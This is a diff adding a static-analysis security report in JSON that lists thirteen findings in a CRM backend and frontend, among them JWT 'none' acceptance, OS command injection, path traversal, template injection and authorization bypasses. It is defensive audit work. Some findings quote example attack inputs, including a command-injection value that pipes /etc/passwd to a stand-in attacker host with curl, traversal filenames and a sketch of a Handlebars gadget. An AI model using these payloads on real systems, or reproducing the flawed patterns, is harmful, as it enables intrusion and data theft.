@@ -1,0 +1,335 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.jwt-none-algorithm-bypass",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 301,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 304,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "processAllocation() verifies a caller-supplied 'x-access-token' (from a @Public() endpoint, organizations.controller.ts:91-99) with jwt.verify(accessToken, secret, { algorithms: ['HS256', 'none'] }). Allowing the 'none' algorithm means an attacker can submit a JWT with header {\"alg\":\"none\"} and no signature, and jsonwebtoken will accept arbitrary 'sub'/'role' claims unauthenticated. This bypasses authentication entirely for the cost-allocation endpoint (and reveals org annualRevenue via 'requestedBy').",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.exec-command-injection",
+      "path": "backend/src/documents/documents.service.ts",
+      "start": {
+        "line": 286,
+        "col": 21,
+        "offset": 0
+      },
+      "end": {
+        "line": 296,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertToExportFormat() builds a shell command by directly interpolating the client-supplied 'exportFormat' (documents.controller.ts:119-126, @Body('exportFormat')) into a template string and runs it with child_process.exec(), which spawns a shell. Any authenticated user can submit e.g. exportFormat='pdf; curl attacker.com/$(cat /etc/passwd)' or use backticks/`$()` to achieve arbitrary OS command execution on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.weak-password-reset-email-only",
+      "path": "backend/src/auth/auth.service.ts",
+      "start": {
+        "line": 237,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 256,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "confirmResetByEmailFallback() resets a user's password given only their email address, with no token, code, or any secondary verification. It is exposed publicly at POST /auth/reset-password/email-fallback (@Public(), auth.controller.ts:61-65). Any unauthenticated attacker who knows a victim's email (e.g. admin@crm.com) can set an arbitrary new password and fully take over the account.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.audit-log-bypass-via-shared-secret",
+      "path": "backend/src/audit-logs/audit-logs.controller.ts",
+      "start": {
+        "line": 35,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 44,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The 'external/:targetId' route uses @Public() and @Roles() (empty), overriding the controller-level @Roles(PLATFORM_ADMIN) guard, so it never checks the caller's role. audit-logs.service.ts:119-143 (serveAuditRecord) only verifies the JWT signature with the same JWT_SECRET used for normal login sessions and never checks claims.role. Any authenticated user (including a CUSTOMER_CONTACT) can send their own login access token as the 'x-access-token' header to read any organization's/any target's audit log history, which is meant to be platform-admin-only and can contain sensitive metadata (IPs, actor emails, changes).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.file.path-traversal-unsanitized-upload-filename",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 385,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 393,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "uploadLogo() writes the uploaded file to disk using the raw client-supplied 'file.originalname' (path.join(publicLogosDir, file.originalname)) with no sanitization, unlike the analogous document/avatar upload paths in documents.service.ts and contacts.service.ts which generate a fresh UUID filename. An account manager or admin can set originalname to a traversal sequence (e.g. '../../src/main.ts' or '../../../etc/cron.d/x') to write/overwrite arbitrary files outside the intended 'public/logos' directory, since the file is served from a public static folder this can also lead to web shell placement if the app serves executable-adjacent content.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal",
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.mass-assignment-object-assign",
+      "path": "backend/src/deals/deals.service.ts",
+      "start": {
+        "line": 332,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 340,
+        "col": 51,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyBulkAdjustment() JSON.parse()s a raw client string into an untyped object and merges it directly onto the Deal entity with Object.assign(deal, adjustment) before saving, bypassing UpdateDealDto's class-validator whitelist entirely. A caller (any PLATFORM_ADMIN/ACCOUNT_MANAGER) can inject arbitrary fields such as organizationId, ownerId, or stage (skipping validateStageTransition) into the persisted row, since there is no allow-list on the parsed keys.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.missing-authorization-sharing-scope-bypass",
+      "path": "backend/src/contacts/contacts.service.ts",
+      "start": {
+        "line": 249,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 273,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "adjustSharingScope() explicitly skips checkModifyPermission() whenever sharingMode === 'partner_shared'. The controller route (contacts.controller.ts:89-96, PUT ':id/sharing-scope') carries no @Roles decorator, so any authenticated user \u2014 including a CUSTOMER_CONTACT with no relationship to the contact \u2014 can call it with sharingMode=partner_shared and change any other organization's contact sharing scope with zero authorization check.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.handlebars-server-side-template-injection",
+      "path": "backend/src/notifications/notifications.service.ts",
+      "start": {
+        "line": 87,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 94,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCustomSegmentMessage() compiles a fully client-supplied 'messageTemplate' string with Handlebars.compile() (notifications.controller.ts:77-84, POST /notifications/segment-message/preview). Handlebars templates are not sandboxed against expressions that reach constructor/prototype chains (e.g. '{{#with this.constructor}}{{#with (lookup this \"constructor\")}}...{{/with}}{{/with}}'-style gadgets used in known Handlebars SSTI exploits), so an attacker with ACCOUNT_MANAGER/PLATFORM_ADMIN access can achieve server-side template injection / remote code execution rather than the intended text substitution. Contrast with renderRenewalDigestMessage() just below, which only ever compiles a fixed, hardcoded template string.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.hardcoded-jwt-secret-fallback",
+      "path": "backend/src/auth/jwt.strategy.ts",
+      "start": {
+        "line": 24,
+        "col": 20,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The JWT signing/verification secret falls back to the hardcoded literal 'crm-jwt-secret-key-change-in-production' whenever the JWT_SECRET environment variable is unset. This same fallback string is reused verbatim across documents.service.ts, webhooks.service.ts, organizations.service.ts and other modules to sign preview/receipt/rotation tokens. If the operator forgets to set JWT_SECRET, every session token and every internal signed token in the app uses a publicly-known secret from the source code, letting anyone forge valid login tokens for any user/role.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.predictable-delegate-access-code",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 323,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 338,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "confirmDelegateAccess() is a @Public() endpoint (organizations.controller.ts:101-108) that grants access to an organization's confidential annualRevenue based on a 'confirmationCode' that is deterministically derived as `${org.id.slice(0,8)}-${org.planTier}`. planTier has only a handful of enum values and the org id prefix/org name are frequently non-secret (visible in URLs, docs, marketing), making the 'confirmation code' guessable/brute-forceable rather than a real secret, allowing unauthorized disclosure of financial data.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.unsanitized-content-disposition",
+      "path": "backend/src/deals/deals.service.ts",
+      "start": {
+        "line": 391,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 402,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportRenewalSummary() sets Content-Disposition using the client-supplied 'documentTitle' query parameter with no CRLF/quote sanitization (`attachment; filename=\"${title}.json\"`), unlike the analogous contacts.service.ts exportContactCard() which explicitly strips \\r\\n from its title before use. Depending on the underlying HTTP stack's header validation, this can allow header/response splitting or filename-parameter injection via a crafted documentTitle.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-without-validation",
+      "path": "backend/src/webhooks/webhooks.controller.ts",
+      "start": {
+        "line": 140,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 149,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getPartnerSchema() reflects any request's Origin header straight back into Access-Control-Allow-Origin with no allow-list check, unlike the sibling ApiKeysController.getExplorerSchema() which validates the origin against a fixed EXPLORER_ALLOWED_ORIGINS list. Although the response body here is non-sensitive, this pattern is a CORS misconfiguration that would become exploitable if the endpoint is later reused for anything containing sensitive data.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.storage.jwt-in-localstorage",
+      "path": "frontend/src/app/core/services/auth.service.ts",
+      "start": {
+        "line": 56,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 57,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The access token and user profile are persisted in localStorage ('crm_token' / 'crm_user') rather than an httpOnly cookie. Any successful XSS elsewhere in the SPA would let an attacker read localStorage and steal the session token for full account takeover.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-522: Insufficiently Protected Credentials"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
